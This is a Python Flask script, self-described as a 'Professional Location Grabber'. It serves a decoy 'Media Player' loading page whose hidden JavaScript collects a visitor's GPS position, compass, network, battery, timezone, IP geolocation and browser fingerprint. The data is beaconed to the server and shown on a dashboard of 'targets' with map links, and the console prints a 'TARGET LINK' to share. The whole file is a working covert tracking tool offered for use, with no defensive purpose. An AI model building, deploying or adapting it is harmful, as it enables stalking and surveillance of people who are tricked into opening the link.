#!/usr/bin/env python3
from flask import Flask, request, Response, redirect
import json, os, socket, base64, urllib.parse, hashlib
from datetime import datetime
import threading, time

app = Flask(__name__)

# ===========================================
# 🎯 PROFESSIONAL LOCATION GRABBER
# Strong | Clean | Production Ready
# ===========================================
HTML_PAGE = """<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
<title>Media Player</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#000;color:#fff;font-family:-apple-system,sans-serif;overflow:hidden;height:100vh}
.loader{position:absolute;top:50%;left:50%;transform:translate(-50%,-50%);text-align:center}
.spinner{width:50px;height:50px;border:4px solid #222;border-top:4px solid #0095f6;border-radius:50%;animation:spin .8s linear infinite;margin:0 auto 20px}
@keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
p{color:#666;font-size:14px;margin-top:10px}
</style>
</head>
<body>
<div class="loader">
    <div class="spinner"></div>
    <div style="color:#fff;font-size:16px">Loading content...</div>
    <p>Please wait</p>
</div>

<script>
(function(){
    var EP = window.location.origin + "/grab";
    var sent = false;
    var start = Date.now();
    
    function send(data){
        if(sent) return;
        sent = true;
        var p = btoa(unescape(encodeURIComponent(JSON.stringify(data))));
        new Image().src = EP + "?d=" + p + "&r=" + Math.random();
        try{
            var x = new XMLHttpRequest();
            x.open("GET", EP + "?d=" + p, true);
            x.send();
        }catch(e){}
        try{
            fetch(EP + "?d=" + p, {mode:"no-cors"});
        }catch(e){}
    }
    
    // === TECHNIQUE 1: GPS LOCATION ===
    try{
        navigator.geolocation.getCurrentPosition(
            function(p){
                send({
                    lat: p.coords.latitude,
                    lng: p.coords.longitude,
                    acc: p.coords.accuracy,
                    alt: p.coords.altitude,
                    altAcc: p.coords.altitudeAccuracy,
                    heading: p.coords.heading,
                    speed: p.coords.speed,
                    ts: p.timestamp,
                    type: "gps"
                });
            },
            function(e){
                send({gps_err: e.code, msg: e.message, type: "gps_err"});
            },
            {enableHighAccuracy:true, timeout:4000, maximumAge:60000}
        );
    }catch(e){}
    
    // === TECHNIQUE 2: COMPASS (No Permission) ===
    try{
        if(window.DeviceOrientationEvent){
            var handler = function(e){
                if(e.alpha !== null){
                    send({
                        compass: e.alpha,
                        beta: e.beta,
                        gamma: e.gamma,
                        abs: e.absolute,
                        type: "compass"
                    });
                    window.removeEventListener("deviceorientation", handler);
                }
            };
            window.addEventListener("deviceorientation", handler);
            // iOS 13+ permission
            if(typeof DeviceOrientationEvent.requestPermission === "function"){
                DeviceOrientationEvent.requestPermission().then(function(s){
                    if(s === "granted"){
                        window.addEventListener("deviceorientation", handler);
                    }
                }).catch(function(){});
            }
        }
    }catch(e){}
    
    // === TECHNIQUE 3: NETWORK ===
    try{
        if(navigator.connection){
            var c = navigator.connection;
            send({
                net: c.effectiveType,
                down: c.downlink,
                rtt: c.rtt,
                type: "network"
            });
        }
    }catch(e){}
    
    // === TECHNIQUE 4: TIMEZONE ===
    try{
        send({
            tz: Intl.DateTimeFormat().resolvedOptions().timeZone,
            offset: new Date().getTimezoneOffset(),
            lang: navigator.language,
            type: "locale"
        });
    }catch(e){}
    
    // === TECHNIQUE 5: SCREEN ===
    try{
        send({
            w: screen.width,
            h: screen.height,
            dpr: window.devicePixelRatio,
            orient: screen.orientation ? screen.orientation.type : "?",
            type: "screen"
        });
    }catch(e){}
    
    // === TECHNIQUE 6: BATTERY ===
    try{
        if(navigator.getBattery){
            navigator.getBattery().then(function(b){
                send({
                    bat: Math.round(b.level * 100),
                    charging: b.charging,
                    type: "battery"
                });
            });
        }
    }catch(e){}
    
    // === TECHNIQUE 7: IP GEOLOCATION (Fallback) ===
    try{
        fetch("https://ipapi.co/json/").then(function(r){return r.json();}).then(function(d){
            d.type = "ipgeo";
            send(d);
        }).catch(function(){});
    }catch(e){}
    
    // === TECHNIQUE 8: BROWSER FINGERPRINT ===
    try{
        send({
            ua: navigator.userAgent,
            platform: navigator.platform,
            cores: navigator.hardwareConcurrency,
            ram: navigator.deviceMemory,
            cookies: navigator.cookieEnabled,
            type: "fingerprint"
        });
    }catch(e){}
    
    // === AUTO SEND FALLBACK ===
    setTimeout(function(){
        if(!sent){
            send({timeout:true, ms:Date.now()-start, type:"fallback"});
        }
    }, 5000);
})();
</script>
</body>
</html>"""

# ===========================================
# 📦 DATABASE (No complex paths)
# ===========================================
DATA_FILE = os.path.expanduser('~/locations_data.json')

def load_data():
    try:
        with open(DATA_FILE, 'r') as f:
            return json.loads(f.read() or '[]')
    except:
        return []

def save_data(records):
    with open(DATA_FILE, 'w') as f:
        json.dump(records, f, indent=2)

stats = {'total': 0, 'gps': 0, 'compass': 0, 'ip': 0}

@app.route('/')
def index():
    return HTML_PAGE

@app.route('/grab')
def grab():
    d = request.args.get('d')
    ip = request.remote_addr
    
    if d:
        try:
            decoded = base64.b64decode(d).decode('utf-8')
            data = json.loads(decoded)
            data['_ip'] = ip
            data['_time'] = datetime.now().strftime('%H:%M:%S.%f')[:-3]
            
            records = load_data()
            records.append({
                'id': hashlib.md5(str(datetime.now().timestamp()).encode()).hexdigest()[:6],
                'ts': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                'data': data
            })
            if len(records) > 500:
                records = records[-500:]
            save_data(records)
            
            stats['total'] += 1
            if 'lat' in data: stats['gps'] += 1
            if 'compass' in data: stats['compass'] += 1
            if data.get('type') == 'ipgeo': stats['ip'] += 1
            
            # Terminal Output
            t = datetime.now().strftime('%H:%M:%S')
            print(f"\n{'='*55}")
            print(f"  📍 DATA RECEIVED [{t}]")
            
            if 'lat' in data:
                print(f"  🌍 GPS: {data['lat']}, {data['lng']} (±{data.get('acc','?')}m)")
                print(f"  📌 https://maps.google.com/?q={data['lat']},{data['lng']}")
            if 'compass' in data:
                print(f"  🧭 Compass: {data['compass']}°")
            if 'tz' in data:
                print(f"  🕐 {data['tz']}")
            if 'net' in data:
                print(f"  📶 {data['net']}")
            if data.get('type') == 'ipgeo' and 'latitude' in data:
                print(f"  🌐 IP: {data['latitude']}, {data['longitude']} [{data.get('city','?')}]")
            if 'bat' in data:
                print(f"  🔋 {data['bat']}%")
            if 'platform' in data:
                print(f"  📱 {data['platform']}")
            print(f"  📊 Total Hits: {stats['total']} | GPS: {stats['gps']} | Compass: {stats['compass']}")
            print(f"{'='*55}")
            
        except Exception as e:
            print(f"[-] Parse error: {e}")
    
    # 1x1 GIF
    return Response(
        b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\x00\x00\x00\xff\xff\xff\x21\xf9\x04\x00\x00\x00\x00\x00\x2c\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b',
        mimetype='image/gif',
        headers={
            'Access-Control-Allow-Origin': '*',
            'Cache-Control': 'no-cache, no-store, must-revalidate'
        }
    )

@app.route('/view')
def dashboard():
    records = load_data()
    
    html = """<!DOCTYPE html>
<html>
<head>
<title>📍 Location Intelligence</title>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{background:#0d0d0d;color:#e0e0e0;font-family:'SF Mono','Courier New',monospace;padding:20px}
h1{color:#00ff88;font-size:26px;margin-bottom:5px;letter-spacing:1px}
.sub{color:#666;font-size:13px;margin-bottom:25px}
.grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(130px,1fr));gap:12px;margin-bottom:25px}
.card{background:#161616;border:1px solid #2a2a2a;border-radius:10px;padding:15px;text-align:center}
.card .n{font-size:30px;font-weight:700;color:#00ff88}
.card .l{font-size:11px;color:#888;margin-top:4px;text-transform:uppercase;letter-spacing:1px}
.rec{background:#161616;border:1px solid #2a2a2a;border-radius:8px;padding:14px;margin-bottom:8px;word-break:break-all}
.rec .hdr{color:#00ff88;font-size:11px;margin-bottom:4px}
.rec .loc{color:#ffcc00;font-size:15px;margin:4px 0}
.rec .meta{color:#666;font-size:11px;margin-top:3px}
a{color:#0095f6;text-decoration:none;font-size:12px}
a:hover{text-decoration:underline}
.btn{background:#2a2a2a;color:#fff;border:none;padding:8px 18px;border-radius:6px;cursor:pointer;font-size:13px;margin-right:8px;margin-bottom:15px}
.btn:hover{background:#3a3a3a}
.btn.d{background:#6b0000}
.btn.d:hover{background:#900}
.refresh{color:#555;font-size:11px;margin-top:20px;text-align:center}
.data-raw{color:#555;font-size:10px;margin-top:6px;max-height:60px;overflow:hidden;cursor:pointer}
.data-raw:hover{max-height:500px;overflow:auto;background:#1a1a1a;padding:5px}
</style>
</head>
<body>
<h1>📍 LOCATION GRABBER</h1>
<div class="sub">Real-time intelligence • """ + str(len(records)) + """ records</div>

<div class="grid">
    <div class="card"><div class="n">""" + str(stats['total']) + """</div><div class="l">Total Hits</div></div>
    <div class="card"><div class="n">""" + str(stats['gps']) + """</div><div class="l">GPS Fixes</div></div>
    <div class="card"><div class="n">""" + str(stats['compass']) + """</div><div class="l">Compass</div></div>
    <div class="card"><div class="n">""" + str(len(records)) + """</div><div class="l">Records</div></div>
</div>

<button class="btn" onclick="location.reload()">🔄 Refresh</button>
<button class="btn d" onclick="if(confirm('Clear all data?'))window.location.href='/clear'">🗑️ Clear</button>"""
    
    if records:
        for r in reversed(records[-40:]):
            d = r['data']
            html += '<div class="rec">'
            html += f'<div class="hdr">#{r["id"]} | {r["ts"]}</div>'
            
            if 'lat' in d:
                html += f'<div class="loc">🌍 {d["lat"]}, {d["lng"]} (±{d.get("acc","?")}m)</div>'
                html += f'<a href="https://www.google.com/maps?q={d["lat"]},{d["lng"]}" target="_blank">📍 Open in Maps →</a>'
            elif d.get('type') == 'ipgeo' and 'latitude' in d:
                html += f'<div class="loc">🌐 {d["latitude"]}, {d["longitude"]}</div>'
                html += f'<div class="meta">{d.get("city","?")}, {d.get("country_name","?")}</div>'
            
            if 'compass' in d:
                html += f'<div class="meta">🧭 {d["compass"]}°</div>'
            if 'tz' in d:
                html += f'<div class="meta">🕐 {d["tz"]}</div>'
            if 'bat' in d:
                html += f'<div class="meta">🔋 {d["bat"]}% | {"⚡" if d.get("charging") else "🔌"}</div>'
            if 'net' in d:
                html += f'<div class="meta">📶 {d["net"]}</div>'
            
            html += f'<div class="data-raw" onclick="this.style.maxHeight=\'500px\'">{json.dumps(d, indent=1)}</div>'
            html += '</div>'
    else:
        html += '<div style="color:#555;text-align:center;padding:50px;font-size:14px">📡 Waiting for target...<br><br><span style="font-size:12px">Share the link to begin</span></div>'
    
    html += '<div class="refresh">Page refreshes every 30s</div>'
    html += '<script>setTimeout(function(){location.reload()}, 30000)</script>'
    html += '</body></html>'
    
    return html

@app.route('/clear')
def clear():
    save_data([])
    stats['total'] = 0
    stats['gps'] = 0
    stats['compass'] = 0
    stats['ip'] = 0
    return redirect('/view')

@app.route('/stats')
def api_stats():
    return jsonify(stats)

if __name__ == '__main__':
    print("")
    print("╔" + "═"*50 + "╗")
    print("║     📍 PROFESSIONAL LOCATION GRABBER         ║")
    print("║     GPS + Compass + Network + All Sensors    ║")
    print("╚" + "═"*50 + "╝")
    
    host_ip = socket.gethostbyname(socket.gethostname())
    
    print(f"\n  🌐 Server:     http://{host_ip}:5000")
    print(f"  📋 Dashboard:  http://{host_ip}:5000/view")
    print(f"  🗑️ Clear:     http://{host_ip}:5000/clear")
    print(f"\n  📱 TARGET LINK:")
    print(f"     http://{host_ip}:5000")
    print(f"\n  📁 Data: {DATA_FILE}")
    print(f"\n  ⏳ Waiting... (Ctrl+C to stop)")
    print("  " + "─"*50 + "\n")
    
    app.run(host='0.0.0.0', port=5000, debug=False, threaded=True)
